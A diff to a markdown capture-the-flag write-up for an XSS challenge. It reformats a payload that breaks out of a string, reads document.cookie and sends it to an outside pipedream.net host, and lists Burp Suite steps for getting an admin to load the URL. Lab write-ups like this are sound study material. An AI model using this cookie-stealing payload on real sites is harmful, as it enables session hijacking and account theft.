@@ -59,7 +59,10 @@ a. CTF XSS 2
 ```javascript
 xss');alert(1);var i=('
 ```
-  - Check Attack => xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;var i=('
+  - Check Attack
+```javascript
+xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;var i=('
+```
   - Send to repeater the POST URL to change GET method
   - Replace the Repeater on Burp Suite, working on the GET method instead of the POST method because the host gets the access
   - The GET URL inputs the admin visit URL bar
